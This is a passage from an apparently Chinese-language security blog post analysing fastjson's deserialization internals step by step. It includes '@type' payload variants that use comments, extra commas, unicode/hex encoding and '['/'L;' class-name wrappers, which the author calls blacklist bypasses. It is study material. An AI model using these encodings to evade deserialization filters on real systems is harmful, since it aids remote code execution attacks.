class="line"></span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>那么就是/*xxxx*/<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123; <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="comment">/**/&quot;<span class="doctag">@type</span>&quot;:&quot;Student&quot;&#125;</span></span><br><span class="line"><span class="comment">&#123;/*abcdef*/</span><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>那么这四种其实效果相同，都可以达到反序列化的目的</p><h3 id="No3-parseObject-gt-AllowArbitraryCommas"><a href="#No3-parseObject-gt-AllowArbitraryCommas" class="headerlink" title="No3 parseObject()-&gt;AllowArbitraryCommas"></a>No3 parseObject()-&gt;AllowArbitraryCommas</h3><p>在走完上面的判断以后，接下来就是<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/10.jpg" alt><br>同样，根据字面意思和代码，大概推断就是判断有没有逗号，如果有就跳过<br>也就是<code>&#123;,,,,&quot;@type&quot;:&quot;Student&quot;&#125;</code>，也是可以进行正常反序列化的</p><h3 id="No4-parseObject-gt-scanSymbol"><a href="#No4-parseObject-gt-scanSymbol" class="headerlink" title="No4 parseObject()-&gt;scanSymbol()"></a>No4 parseObject()-&gt;scanSymbol()</h3><p>继续往下走<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/11.jpg" alt><br>因为走完前面的一系列操作，那么当前的字符就是@type之前的双引号了<br>这里的scanSymbol很重要，主要就是扫描到下一个双引号出现之前的字符串，在这就是@type<br>其中有几段比较重要的特性，我这截取了部分代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chLocal == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">    chLocal = <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">switch</span>(chLocal) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c4</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[]&#123;c1, c2, c3, c4&#125;), <span class="number">16</span>);</span><br><span class="line">            hash = <span class="number">31</span> * hash + val;</span><br><span class="line">            <span class="built_in">this</span>.putChar((<span class="type">char</span>)val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">x1</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">x2</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">x_val</span> <span class="operator">=</span> digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">            <span class="type">char</span> <span class="variable">x_char</span> <span class="operator">=</span> (<span class="type">char</span>)x_val;</span><br><span class="line">            hash = <span class="number">31</span> * hash + x_char;</span><br><span class="line">            <span class="built_in">this</span>.putChar(x_char);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>什么意思呢，就是当遇见斜杠，那么就看斜杠后面第一个字母是什么<br>如果是u那就读取u后面4位，当作unicode解码<br>同理如果是x就当作十六进制解码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79\x70\x65&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>这上面5个json是等价的，都可以正常进行反序列化</p><h3 id="No5-parseObject-gt-TypeUtils-loadClass"><a href="#No5-parseObject-gt-TypeUtils-loadClass" class="headerlink" title="No5 parseObject()-&gt;TypeUtils.loadClass()"></a>No5 parseObject()-&gt;TypeUtils.loadClass()</h3><p>提取完了@type这个键的字符串以后，就要解析键值了，在这里就是Student<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/12.jpg" alt><br>可以看到同样用到了scanSymbol，也就是说我们的类名也可以用十六进制和unicode去编码<br><code>&#123;&quot;\x40\x74\x79pe&quot;:&quot;\u0053\u0074\u0075dent&quot;&#125;</code><br>接着就进入到了loadClass了，动态加载类<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/13.jpg" alt><br>首先会在mappings中去找是否存在这些类，如果不存在就跳到<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = classLoader.loadClass(className);</span><br><span class="line">    mappings.put(className, clazz);</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>去动态加载类，并且将类和类名添加到mappings中，然后返回此类，这里的mappings其实是一个缓存，一般是java的原生类，关于动态加载类到底知识可以自己百度搜索一下，这里不细说</p><blockquote><p>小插曲<br>这里我注意到了中间两个if语句<br>第一个：如果第一个字符是“[”，那么就将他去掉，在进行loadClass<br>第二个：如果第一个字符是“L”,且结尾是“;”，那么也是去掉以后调用loadClass<br>这里我fuzz了一下<br><code>&#123;&quot;@type&quot;:&quot;[Student&quot;&#125;</code><br>中括号加在最前面会报错，不知道为什么，但是根据他的报错信息，我最后整理了一个新的可以利用的，在下一篇我会说一下我是如何找出这样的payload的<code>&#123;&quot;@type&quot;:&quot;[Student&quot;[&#123;,&quot;age&quot;:12,&quot;name&quot;:&quot;kaikaix&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LStudent;&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LLStudent;;&quot;&#125;</code><br>这样就不会报错，可以继续接下来的操作，调用无参构造和set方法</p></blockquote><h3 id="No6-parseObject-gt-getDeserializer"><a href="#No6-parseObject-gt-getDeserializer" class="headerlink" title="No6 parseObject()-&gt;getDeserializer()"></a>No6 parseObject()-&gt;getDeserializer()</h3><p>接下来到了<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/14.jpg" alt><br>我们进入到getDeserializer中，中间会到了一个denyList的一个循环<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/15.jpg" alt><br>这里前面的replace是将“$”替换为“.”</p><blockquote><p>如果A类中有个内部类B<br>在编译的时候会生成A.class和A$B.class</p></blockquote><p>那么这一段代码就是用来检查你的类名是否在黑名单中，但是在这个版本的fastjson，黑名单只有两个Thread类</p><h3 id="No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer"><a href="#No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer" class="headerlink" title="No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()"></a>No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()</h3><p>过了黑名单以后，就会与一些fastjson支持的类进行匹配，如果匹配到了就会返回相应的Deserializer<br>如果匹配不到就到下图代码中的地方<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/16.jpg" alt><br>进入到这个函数中会先获取一下clazz的父类，然后就到了这里<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/17.jpg" alt><br>主要就是通过获取构造函数和一些成员方法构建了一个JavaBeanInfo类，并返回<br>这里需要提的是，他在内部会判断一个成员方法是否是setXxx方法或getXxx方法，如果符合一些条件就会添加入fieldList这个数组中<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//set的</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; </span><br><span class="line">!Modifier.isStatic(method.getModifiers()) &amp;&amp; </span><br><span class="line">(method.getReturnType().equals(Void.TYPE) || </span><br><span class="line">method.getReturnType().equals(method.getDeclaringClass())))&#123;</span><br><span class="line">    <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">        add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(</span><br><span class="line">                propertyName, </span><br><span class="line">                method, </span><br><span class="line">                field, </span><br><span class="line">                clazz, </span><br><span class="line">                type, </span><br><span class="line">                ordinal, </span><br><span class="line">                serialzeFeatures, </span><br><span class="line">                parserFeatures, </span><br><span class="line">                annotation, </span><br><span class="line">                fieldAnnotation, </span><br><span class="line">                (String)<span class="literal">null</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get的</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; </span><br><span class="line">!Modifier.isStatic(method.getModifiers()) &amp;&amp; </span><br><span class="line">methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; </span><br><span class="line">Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; </span><br><span class="line">method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; </span><br><span class="line">(Collection.class.isAssignableFrom(method.getReturnType()) ||</span><br><span class="line">Map.class.isAssignableFrom(method.getReturnType()) || </span><br><span class="line">AtomicBoolean.class == method.getReturnType() || </span><br><span class="line">AtomicInteger.class == method.getReturnType() || </span><br><span class="line">AtomicLong.class == method.getReturnType()))&#123;</span><br><span class="line">    add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(</span><br><span class="line">            propertyName, </span><br><span class="line">            method, </span><br><span class="line">            (Field)<span class="literal">null</span>, </span><br><span class="line">            clazz, </span><br><span class="line">            type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">            annotation, </span><br><span class="line">            (JSONField)<span class="literal">null</span>, </span><br><span class="line">            (String)<span class="literal">null</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>从上面的代码可以看出，如果要把set方法添加进入fieldList，那么此方法需要满足的几个点</p><ul><li>返回值为void类型或者返回值的类型是当前类</li><li>不能是静态方法</li><li>开头是set<br>我这里用下面两块代码来解释一下第一点<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Student <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>get的满足条件</p><ul><li>Method不是静态的</li><li>Method无参数</li><li>Method的返回类型要继承自上面所写的类</li></ul><p>接下来解释一下FieldInfo的几个重要参数</p><ul><li>propertyName，简而言之就是getXxx或setXxx的Xxx，也就是相应方法的变量名称，是一个字符串类型</li><li>method，就是一个Method类，是getXxx或setXxx的反射</li></ul><p>这个fieldList在后面调用方法的时候有重要作用<br>当把所有相应的方法加到fieldList中后，就到了这个函数的最后一步<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/18.jpg" alt><br><code>return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);</code><br>会把fieldList和该class类的反射封装到JavaBeanInfo里面<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/19.jpg" alt><br>这里需要注意一下这段代码，他会把传入的fieldList进行一个排序，然后赋值给sortedFields<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/20.jpg" alt><br>接下来走到这，重新new了一个JavaBeanDeserializer对象，不过和上面的步骤相同，然后返回</p><h3 id="No8-parseObject-gt-deserializer-deserialze"><a href="#No8-parseObject-gt-deserializer-deserialze" class="headerlink" title="No8 parseObject()-&gt;deserializer.deserialze()"></a>No8 parseObject()-&gt;deserializer.deserialze()</h3><p>返回以后最后赋值给了deserializer，也就是No6<br>我们看到deserializer有一个sortedFieldDesrializers，也就是No7中的sortedFields<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/21.jpg" alt><br>接下来直接看到parseField<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/22.jpg" alt><br>这个函数主要就是用来调用getXxx或者setXxx，对Xxx进行一些赋值操作<br>进入此函数，可以看到开头有一个smartMatch<br>节选一段重要代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FieldDeserializer <span class="title function_">smartMatch</span><span class="params">(String key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (snakeOrkebab) &#123;</span><br><span class="line">        fieldDeserializer = getFieldDeserializer(key2);</span><br><span class="line">        <span class="keyword">if</span> (fieldDeserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (FieldDeserializer fieldDeser : sortedFieldDeserializers) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldDeser.fieldInfo.name.equalsIgnoreCase(key2)) &#123;</span><br><span class="line">                    fieldDeserializer = fieldDeser;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>key2就是getXxx或者setXxx对应的Xxx<br>上面的代码就是从sortedFieldDeserializers数组中（No7中的fieldList）寻找是否有可以匹配得到的，匹配得到就返回FieldDeserializer，匹配不到就返回null<br>如果是null就会执行的下面的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">deserOrField</span> <span class="operator">=</span> extraFieldDeserializers.get(key);</span><br><span class="line"><span class="keyword">if</span> (deserOrField != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (deserOrField <span class="keyword">instanceof</span> FieldDeserializer) &#123;</span><br><span class="line">        fieldDeserializer = ((FieldDeserializer) deserOrField);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> (Field) deserOrField;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(key, field.getDeclaringClass(), field.getType(), field.getGenericType(), field, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        fieldDeserializer = <span class="keyword">new</span> <span class="title class_">DefaultFieldDeserializer</span>(parser.getConfig(), clazz, fieldInfo);</span><br><span class="line">        extraFieldDeserializers.put(key, fieldDeserializer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从extraFieldDeserializers中get相应的field<br>extraFieldDeserializers是一个HashMap，键是所有的成员变量，值是成员变量对应的field，最后fieldDeserializer就是对相应field进行一次封装<br>最后用这个封装好的类进行parseField<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/24.jpg" alt></p><h3 id="No9-parseObject-gt-deserializer-deserialze-gt-parseField-gt-fieldDeserializer-parseField"><a href="#No9-parseObject-gt-deserializer-deserialze-gt-parseField-gt-fieldDeserializer-parseField" class="headerlink" title="No9 parseObject()-&gt;deserializer.deserialze()-&gt;parseField()-&gt;fieldDeserializer.parseField()"></a>No9 parseObject()-&gt;deserializer.deserialze()-&gt;parseField()-&gt;fieldDeserializer.parseField()</h3><p>首先对value进行解析，这里可以看到，如果是byte类型，那么就会对其进行一个base64解码<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/23.jpg" alt><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/25.jpg" alt><br>所以如果要给byte类型进行反序列化，那么就需要先进行一次base64加密<br>赋值完以后就进入了setValue操作，给反序列化的对象设置值<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/26.jpg" alt><br>setValue的实现<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object, Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span> <span class="comment">//</span></span><br><span class="line">        &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> fieldInfo.method;</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                method.invoke(object, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> fieldInfo.field;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(fieldInfo.fieldClass)) &#123;</span><br><span class="line">                    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                    field.set(object, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;set property error, &quot;</span> + fieldInfo.name, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>大致的思路就是看之前的fieldInfo中是否有method，在No7中有相关的操作，如果有就会去invoke。<br>所以如果有相关的getXxx方法或者setXxx想去调用，那在反序列化的时候必须把相关的Xxx变量加到json数据中，这样才会有相应的变量封装到fieldDeserializer（No8步骤），之后才会在setValue的时候去调用对应的getXxx或者setXxx方法</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大致思路就是如此，光听文章分析能学到的东西是很有限的，最后还是需要自己动手去调试。</p><p>在写这篇文章之前也不知道一些绕过方法，只是分析了一下fastjson的原理，后面看到网上的那些方法，没想到我竟然凑巧把这些绕过payload自己搞出来了，还是有点小高兴。所以说知道原理还是很重要的。<br>在下一篇就研究一下fastjson的反序列化利用，和一些绕过payload</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;写这篇文章就是来简单理解一下他反序列化的原理，内核实现&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="fastjson" scheme="http://example.com/categories/fastjson/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="fastjson" scheme="http://example.com/tags/fastjson/"/>
    
  </entry>
  
</feed>
